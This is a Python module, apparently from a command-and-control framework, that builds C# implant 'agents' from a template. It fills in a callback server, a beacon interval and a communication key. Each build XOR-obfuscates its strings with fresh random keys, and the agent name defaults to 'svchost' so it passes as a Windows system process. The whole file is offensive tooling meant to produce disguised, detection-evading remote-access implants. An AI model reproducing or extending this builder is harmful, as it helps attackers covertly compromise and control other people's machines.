import os
import secrets
import hashlib
import base64
import time
from datetime import datetime
from pathlib import Path
from core.config import Config
from core.crypto import crypto

class BuilderEngine:
    """Advanced agent compilation and generation engine"""

    def __init__(self):
        self.template_path = Config.BASE_DIR / "builder" / "templates" / "agent.cs"
        self.template_path.parent.mkdir(parents=True, exist_ok=True)

    def _xor_encrypt(self, text: str, key: bytes) -> str:
        data = text.encode('utf-8')
        encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        return base64.b64encode(encrypted).decode()

    def generate_source(self, bc: dict) -> str:
        """Generate C# source from config"""
        
        # Generate random keys for this build
        str_key = secrets.token_bytes(16)
        comm_key = secrets.token_bytes(32)
        
        # Prepare encrypted config
        context = {
            'server': self._xor_encrypt(bc['server'], str_key),
            'id': self._xor_encrypt(bc.get('id', secrets.token_hex(8)), str_key),
            'name': self._xor_encrypt(bc.get('name', 'svchost'), str_key),
            'comm_key': self._xor_encrypt(comm_key.hex(), str_key),
            'str_key_hex': str_key.hex(),
            'beacon': bc.get('beacon', 5000),
            'version': Config.VERSION,
            'build_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'sig': secrets.token_hex(8)
        }
        
        # In a real @god implementation, we'd use Jinja2 here.
        # For now, we'll use a robust string replacement to keep it simple but modular.
        if not self.template_path.exists():
            return "// TEMPLATE MISSING"
            
        with open(self.template_path, 'r', encoding='utf-8') as f:
            source = f.read()
            
        for k, v in context.items():
            source = source.replace(f"{{{{ {k} }}}}", str(v))
            
        return source

builder = BuilderEngine()
